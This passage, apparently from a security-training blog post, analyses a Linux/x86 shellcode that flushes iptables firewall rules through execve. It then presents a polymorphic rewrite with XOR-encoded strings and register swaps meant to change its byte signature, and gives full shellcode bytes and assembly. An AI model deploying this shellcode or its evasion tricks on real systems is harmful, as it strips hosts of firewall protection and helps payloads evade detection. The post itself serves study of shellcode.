class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;69&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;6e&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;68&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;2f&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;73&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e3&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;50&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;56&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;53&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;e1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;c2&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;b0&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;0b&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;80&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; shellcode.bin

ndisasm &lt;span class=&quot;nt&quot;&gt;-b&lt;/span&gt; 32 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; intel shellcode.bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Follows the output of &lt;code&gt;ndisasm&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; clear EAX, setting it to 0x00000000&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000000&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;31&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C0&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; null terminator for the string below&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000002&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;50&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; string -F&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000003&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;66682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;D46&lt;/span&gt;          &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x462d&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; save the pointer to the string into ESI&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000007&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E6&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; NULL terminator for the string below&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000009&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;50&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; string ///sbin/iptables&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;A&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;68626&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;C6573&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73656c62&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000000&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;6869707461&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x61747069&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000014&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;6862696&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E2F&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2f6e6962&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000019&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;682&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;F2F2F73&lt;/span&gt;        &lt;span class=&quot;nv&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;dword&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x732f2f2f&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; save the pointer to the string into EBX&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;0000001&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E&lt;/span&gt;  &lt;span class=&quot;mi&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;E3&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; array of pointers to command-line arguments:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   - ebx -&amp;gt; pointer to string '///sbin/iptables'&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   - esi -&amp;gt; pointer to string '-F'&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   - eax -&amp;gt; 0x00000000 (null terminator of the array)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000020&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;50&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000021&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;56&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000022&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;53&lt;/span&gt;                &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;So far, the author of this shellcode pushed the string &lt;code&gt;///sbin/iptables&lt;/code&gt; to the stack, saving its pointer into the register &lt;code&gt;EBX&lt;/code&gt;, which is going be used by &lt;code&gt;execve&lt;/code&gt; as the &lt;strong&gt;1st argument&lt;/strong&gt; of iptables.&lt;/p&gt;
&lt;p&gt;Follows the function prototype of &lt;code&gt;execve&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;
  &lt;span class=&quot;c1&quot;&gt;// executable to run&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pathname&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// array of command-line arguments&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[],&lt;/span&gt;

  &lt;span class=&quot;c1&quot;&gt;// array of environment variables&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In this case &lt;code&gt;EBX&lt;/code&gt; is &lt;code&gt;pathname&lt;/code&gt;, i.e. a pointer to a string indicating the executable to run. While &lt;code&gt;ECX&lt;/code&gt; is a pointer to an array of pointers, terminated by the DWORD &lt;code&gt;0x00000000&lt;/code&gt;. On the stack, it would look like this:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; *ebx -&amp;gt; '///sbin/iptables'&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; *esi -&amp;gt; '-F'&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; 0x00000000&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Follows the rest of the disassembly:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;                            &lt;span class=&quot;c1&quot;&gt;; 2nd argument of execve:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to array of pointers to strings acting as&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   command-line arguments of the program&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000023&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;E1&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; 3rd argument of execve:&lt;/span&gt;
                            &lt;span class=&quot;c1&quot;&gt;;   pointer to array of pointers to env. variables&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000025&lt;/span&gt;  &lt;span class=&quot;err&quot;&gt;89&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;C2&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

                            &lt;span class=&quot;c1&quot;&gt;; call execve syscall&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000027&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;B00B&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xb&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt;00000029&lt;/span&gt;  &lt;span class=&quot;nf&quot;&gt;CD80&lt;/span&gt;              &lt;span class=&quot;nv&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;These instructions use &lt;code&gt;execve&lt;/code&gt; to run the command &lt;code&gt;///sbin/iptables -F&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&quot;polymorphic-shellcode&quot;&gt;Polymorphic shellcode&lt;/h2&gt;
&lt;p&gt;Follows the polymorphic version of the shellcode:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;; Title: Linux/x86 - iptables --flush&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Author: Robert C. Raducioiu&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Web: rbct.it&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Reference: http://shell-storm.org/shellcode/files/shellcode-825.php&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Shellcode: &quot;\x31\xdb\xf7\xe3\x52\x66\xbf\x2d\x46\x66\x57\x89\xe7\x52\xbe\x74\x63\x62\x72\x52\x68\x62\x6c\x65\x73\x68\x1d\x13\x16\x13\x31\x34\x24\x68\x62\x69\x6e\x2f\x68\x5b\x4c\x4d\x01\x31\x34\x24\x89\xe3\x52\x57\x53\xb0\x0a\x40\x54\x59\xcd\x80&quot;&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;; Length: 58 bytes&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; clear EBX, EAX, and EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; instead of pushing EAX, push EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; push word 0x462d&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; instead of pushing the WORD 0x462d, use two steps&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;di&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x462d&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;di&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; use edi instead of esi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; use EBX or EDX instead of EAX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; XOR key ('rbct')&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72626374&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; NULL DWORD acting as the string terminator for&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   the path of the executable&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73656c62&lt;/span&gt;
    
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1316131d&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2f6e6962&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x014d4c5b&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; save the pointer to the string into EBX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; instead of 'push eax' use 'push edx', as they are both set to 0x0 &lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;al&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xa&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; use the PUSH-POP technique instead of the MOV instruction&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;pop&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ecx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; call execve&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Now let me describe the changes. First, I've changed the following instructions:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;word&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x462d&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;eax&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Into this:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nf&quot;&gt;global&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;_start&lt;/span&gt;

&lt;span class=&quot;nf&quot;&gt;section&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;.text&lt;/span&gt;

&lt;span class=&quot;nl&quot;&gt;_start:&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; clear EBX, EAX, and EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mul&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ebx&lt;/span&gt;
    
    &lt;span class=&quot;c1&quot;&gt;; instead of pushing EAX, push EDX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; push word 0x462d&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;; instead of pushing the WORD 0x462d, use two steps&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;di&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x462d&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;di&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Starting from the beginning, instead of clearing only the register &lt;code&gt;EAX&lt;/code&gt;, I'm also clearing &lt;code&gt;EBX&lt;/code&gt; and &lt;code&gt;EDX&lt;/code&gt;. Moreover, instead of using the instruction &lt;code&gt;push eax&lt;/code&gt;, I'm using &lt;code&gt;push edx&lt;/code&gt; in order to change the byte of the instruction.&lt;/p&gt;
&lt;p&gt;Next, instead of using the instruction &lt;code&gt;push 0x462d&lt;/code&gt; I chose a two-steps approach, at the cost of adding more bytes to the shellcode.&lt;/p&gt;
&lt;p&gt;In particular, I chose to use the &lt;code&gt;MOV&lt;/code&gt; instruction to copy the WORD &lt;code&gt;0x462d&lt;/code&gt; into the 16-bits &lt;code&gt;DI&lt;/code&gt; register, and after that push it to the stack.&lt;/p&gt;
&lt;p&gt;After that:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;; use edi instead of esi&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;
  
    &lt;span class=&quot;c1&quot;&gt;; use EBX or EDX instead of EAX&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Instead of saving the pointer to the string &lt;code&gt;-F&lt;/code&gt; into the register &lt;code&gt;ESI&lt;/code&gt;, I'm using the register &lt;code&gt;EDI&lt;/code&gt;, thus changing the bytes of the shellcode.&lt;/p&gt;
&lt;p&gt;Next, I chose to use &lt;code&gt;push edx&lt;/code&gt; instead of &lt;code&gt;push eax&lt;/code&gt;, as both these registers are cleared, thus set to &lt;code&gt;0x00000000&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Follows the next piece of assembly code to analyse:&lt;/p&gt;
&lt;div class=&quot;language-nasm highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;; XOR key ('rbct')&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;mov&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x72626374&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;; NULL DWORD acting as the string terminator for&lt;/span&gt;
    &lt;span class=&quot;c1&quot;&gt;;   the path of the executable&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;edx&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x73656c62&lt;/span&gt;
    
    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1316131d&lt;/span&gt;
    &lt;span class=&quot;nf&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;esp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;esi&lt;/span&gt;

    &lt;span class=&quot;nf&quot;&gt;push&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x2f6e6962&lt;/span&gt;

